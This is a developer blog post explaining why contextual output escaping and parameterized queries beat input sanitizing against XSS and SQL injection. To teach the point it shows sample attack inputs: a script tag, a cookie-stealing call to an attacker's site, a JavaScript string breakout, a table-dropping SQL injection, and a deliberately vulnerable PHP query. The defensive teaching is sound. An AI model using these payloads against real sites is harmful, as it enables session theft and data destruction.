---
layout: default
title: Don’t try to sanitize input. Escape output.
permalink: /writings/dont-sanitize-do-escape/
description: Why you should (always) escape output correctly, but generally not sanitize or filter user input.
---
<h1><a href="{{ page.permalink }}">{{ page.title }}</a></h1>
<p class="subtitle">February 2020</p>


Every so often developers talk about "sanitizing user input" to prevent cross-site scripting attacks. This is well-intentioned, but leads to a false sense of security, and sometimes mangles perfectly good input.


### How does cross-site scripting happen?

A website is vulnerable to cross-site scripting (XSS) attacks if users can enter information that the site "repeats back verbatim" to them in the HTML. The might be minor (HTML that breaks the page layout) or major (JavaScript that sends the users login cookie to the attacker's site). Let's walk through a concrete example:

1. NaiveSite allows you to enter your name, which is shown on your public profile page.
2. Billy the Kid enters his name as `Billy <script>alert('Yo ho ho!')</script>`.
3. Anyone who visits Billy's profile page gets some HTML which includes the unescaped `script` tag, which their browser runs.
4. If the `alert()` were changed to something more malicious, like `sendCookies('https://billy.com/cookies')`, Billy may now be collecting the unsuspecting visitor's login information.

Side note: it isn't quite this simple, as login cookies are usually marked `HttpOnly`, which means they're not accessible to JavaScript. But this is NaiveSite, so it's likely they made both an XSS mistake and a cookie one.


### Why input filtering isn't a great idea

A developer has heard about "input filtering" or "sanitizing input", so they write some code to strip out unsafe HTML characters `<>&` from the name before storing it. Problem solved!

But there are two problems with this. For one, a couple might sign up to NaiveSite as <code>Bob&nbsp;&amp;&nbsp;Jane&nbsp;Smith</code>, but the filtering code strips the `&`, and suddenly Bob's middle name is Jane. Or if the filter is a bit more zealous and also strips `'` and `"`, someone like Bill O'Brien becomes Bill OBrien. Messing up [people's names](https://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/) is not a good look.

Perhaps more importantly, it gives a false sense of security. What does "unsafe" mean? In what context? Sure, `<>&` are unsafe characters for HTML, but what about CSS, JSON, SQL, or even shell scripts? Those have a completely different set of unsafe characters.

For example, NaiveSite might have an HTML template that looks like this:

    <html>
    ...
    <script>
    var name = "<?=$name?>";
    </script>

If an attacker sets their name to include double quotes, like `"; badFunc(); "`, they can run arbitrary code on any NaiveSite pages that display the user's name (which is probably all of them if you're logged in).

Another example is SQL injection, an attack that's closely related to cross-site scripting. NaiveSite is powered by MySQL, and it finds users like so:

```php
$query = "SELECT * FROM users WHERE name = '{$name}';"
```

When a boy named [`Robert'); DROP TABLE users;`](https://xkcd.com/327/) comes along, NaiveSite's entire user database is deleted. Oops!

In short, it's no good to strip out "dangerous characters", because some characters are dangerous in some contexts and perfectly safe in others.


### Escape your output instead

The only code that knows what characters are dangerous is the code that's outputting in a certain context.

So the better approach is to store whatever name the user enters verbatim, and then have the template language HTML-escape when outputting HTML, or properly escape JSON when outputting JSON or including in JavaScript. And of course use your SQL engine's "parameterized query" features so it properly escapes variables when building SQL.

This is sometimes called “contextual escaping”. If you happen to use Go's [`html/template`](https://golang.org/pkg/html/template/) package, you get automatic contextual escaping for HTML, CSS, and JavaScript.


### What about when you want raw input?

One tricky situation is when the app's purpose is allowing a user to enter HTML or Markdown for display. You can't escape the HTML when rendering the output, because the whole purpose is to allow them to add links, images, headings, etc.

So you have to take a different approach. If you're using Markdown, you can either:

1) Allow them to only enter pure Markdown (that is, no raw HTML), and escape HTML as usual. This is the most secure option, but also more restrictive.
2) Allow them to use HTML in the Markdown, but only a whitelist of allowed tags and attributes, such as `<a>` and `<img>`. Both [Stack Exchange](https://meta.stackexchange.com/a/135909/160696) and [GitHub](https://github.github.com/gfm/#disallowed-raw-html-extension-) take this second approach.

If you're not using Markdown but want to let your users enter HTML, you only have the second option&nbsp;&ndash; you must have a whitelist of HTML tags

So in cases where you do need to "echo" raw user input, carefully filter input based on a restrictive whitelist, and store the result in the database. When you come to output it, output it as stored without escaping.

The parallel for SQL injection would be if you're building an app that allows users to enter arbitrary SQL queries. You might want to allow them to enter `SELECT` queries but not data-modification queries. In these cases you're best off using a proper SQL parser ([for example](https://github.com/xwb1989/sqlparser)) to ensure it's a well-formed `SELECT` query.


### Further reading

OWASP has two cheat sheets on [Cross Site Scripting Prevention](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet) and [SQL Injection Prevention](https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) that contain a lot of further information good escaping.

There's also a StackOverflow [answer to "How can I sanitize user input with PHP?"](https://stackoverflow.com/questions/129677/how-can-i-sanitize-user-input-with-php/130323#130323) that is somewhat PHP-specific, but I found succinct and helpful. It links to a page on PHP [magic quotes](https://www.php.net/manual/en/security.magicquotes.php), which were a bad idea and actually removed in PHP 5.4&nbsp;&ndash; the discussion there is very much in line with what I've written above.

If you have any feedback on this article, please get in touch!
